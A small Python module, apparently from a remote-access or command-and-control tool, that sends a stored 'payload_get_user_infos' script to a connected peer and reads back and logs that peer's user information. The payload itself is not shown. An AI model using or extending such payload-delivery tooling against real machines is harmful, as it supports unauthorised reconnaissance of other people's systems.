from dataManager.repository.userRepository import UserRepository
import logging
import ast

class Recognizer:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "recognizer"
        self.user_repository: UserRepository = user_repository
        
    async def get_user_infos(self, reader, writer) -> dict:
        with open("./modules/payloads/recognition/payload_get_user_infos.py", "rb") as f:
            writer.write(f.read())
            await writer.drain()
            data = await reader.read(4096)
            message = data.decode()
            logging.info(f"Received user infos from {writer.get_extra_info('peername')} : {message}")
            return ast.literal_eval(message)
        

